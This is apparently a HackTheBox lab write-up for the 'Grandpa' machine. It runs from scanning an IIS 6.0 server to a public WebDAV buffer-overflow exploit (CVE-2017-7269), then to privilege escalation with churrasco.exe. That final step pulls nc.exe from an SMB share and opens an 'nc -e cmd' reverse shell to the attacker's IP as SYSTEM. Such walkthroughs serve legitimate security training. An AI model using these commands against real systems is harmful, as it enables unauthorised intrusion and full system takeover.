---
title: HTB | Grandpa
author: Zeropio
date: 2023-01-02
categories: [Pentesting, HackTheBox]
tags: [htb, windows, easy, machines]
permalink: /pentesting/htb/machines/grandpa
image:
  path: /assets/img/hackthebox/card/Grandpa.png
  width: 800
  height: 500
---

# Fingerprint

## Scan

The scan show:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Date: Mon, 02 Jan 2023 12:29:15 GMT
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration

There are some exploits for the version of IIS:

```console
$ searchsploit iis 6.0
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name D | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service   | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service            | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Serv | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflo | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                 | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)             | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)             | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)         | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                | windows/remote/19033.txt
------------------------------------------------------------------------ ---------------------------------
```

In the page there isnâ€™t much information:

![Untitled](/assets/img/hackthebox/labs/grandpa/Untitled.png)

Fuzzing will show:

```
images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 85ms]
_private                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 53ms]
aspnet_client           [Status: 403, Size: 218, Words: 14, Lines: 2, Duration: 53ms]
_vti_cnf                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 52ms]
_vti_log                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 52ms]
_vti_pvt                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 65ms]
_vti_txt                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 88ms]
_vti_bin                [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 103ms]
Images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 48ms]
IMAGES                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 47ms]
                        [Status: 200, Size: 1433, Words: 131, Lines: 40, Duration: 60ms]
_vti_inf.html           [Status: 200, Size: 1754, Words: 198, Lines: 45, Duration: 48ms]
postinfo.html           [Status: 200, Size: 2440, Words: 327, Lines: 58, Duration: 51ms]
.                       [Status: 200, Size: 1433, Words: 131, Lines: 40, Duration: 48ms]
pagerror.gif            [Status: 200, Size: 2806, Words: 2, Lines: 1, Duration: 56ms]
iisstart.htm            [Status: 200, Size: 1433, Words: 131, Lines: 40, Duration: 76ms]

```

---

# Footprint

## Initial Access

We will use this [exploit](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) 

```console
$ python2 iis_exploit.py 10.10.10.14 80 10.10.14.7 443
```

## Privilege Escalation

Start a SMB server:

```console
$ smbserver.py share $(pwd)
```

This will be the content of the server:

```console
C:\WINDOWS\Temp>dir \\10.10.14.7\share\

 Directory of \\10.10.14.7\share

01/02/2023  03:28 PM    <DIR>          .
01/02/2023  03:22 PM    <DIR>          ..
01/02/2023  03:28 PM            28,160 nc.exe
01/02/2023  03:24 PM            31,232 churrasco.exe
```

Download the exploit and send the shell:

```console
C:\WINDOWS\Temp>copy \\10.10.14.7\share\churrasco.exe
C:\WINDOWS\Temp>.\churrasco.exe "\\10.10.14.7\share\nc.exe -e cmd 10.10.14.7 443"
```

```console
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.14] 1038
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
nt authority\system
```
